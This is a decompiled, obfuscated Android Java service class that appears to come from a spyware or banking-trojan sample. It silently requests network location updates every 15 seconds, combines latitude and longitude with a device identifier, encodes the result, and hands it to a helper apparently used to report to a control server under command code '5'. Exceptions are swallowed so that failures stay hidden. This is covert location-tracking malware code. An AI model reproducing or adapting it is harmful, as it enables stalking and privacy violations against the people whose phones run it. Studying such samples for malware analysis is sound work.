package wocwvy.czyxoxmbauu.slsa;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;

public class frvvkgp extends Service {

    /* renamed from: a */
    public LocationManager f414a;

    /* renamed from: b */
    C0039c f415b = new C0039c();

    /* renamed from: c */
    C0034b f416c = new C0034b();

    /* renamed from: d */
    private LocationListener f417d = new LocationListener() {
        public void onLocationChanged(Location location) {
            frvvkgp.this.m291a(location);
        }

        public void onProviderDisabled(String str) {
        }

        public void onProviderEnabled(String str) {
        }

        public void onStatusChanged(String str, int i, Bundle bundle) {
        }
    };

    /* access modifiers changed from: private */
    /* renamed from: a */
    public void m291a(Location location) {
        if (location != null && location.getProvider().equals("network")) {
            StringBuilder sb = new StringBuilder();
            sb.append("p=");
            C0034b bVar = this.f416c;
            StringBuilder sb2 = new StringBuilder();
            sb2.append(this.f416c.mo247q(this));
            sb2.append(":");
            sb2.append(m293b(location));
            sb2.append(":NETWORK:");
            sb.append(bVar.mo225c(sb2.toString()));
            this.f416c.mo218b(this, "5", sb.toString());
        }
    }

    /* renamed from: b */
    private String m293b(Location location) {
        if (location == null) {
            return "";
        }
        return String.format("%1$.4f:%2$.4f", new Object[]{Double.valueOf(location.getLatitude()), Double.valueOf(location.getLongitude())}).replace(",", ".");
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        try {
            checkCallingOrSelfPermission("android.permission.ACCESS_FINE_LOCATION");
            this.f414a = (LocationManager) getSystemService("location");
            this.f414a.requestLocationUpdates("network", 15000, 10.0f, this.f417d);
        } catch (Exception unused) {
        }
        return i;
    }
}
